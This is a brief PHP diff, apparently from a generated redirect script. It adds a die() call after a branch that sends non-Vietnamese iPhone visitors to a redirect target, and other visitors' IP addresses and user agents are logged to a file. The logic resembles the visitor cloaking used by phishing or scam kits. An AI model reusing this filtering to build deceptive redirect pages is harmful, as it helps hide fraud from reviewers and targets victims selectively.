@@ -246,6 +246,7 @@ if (
     die();
 } elseif ($country !== \'VN\' && strpos($_SERVER["HTTP_USER_AGENT"], "iphone") !== false) {
   echo "' . $redirectPN . '";
+  die();
 } else {
     $fAgent = fopen($allowedAgents, \'a\');
     $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' ok \' . PHP_EOL;
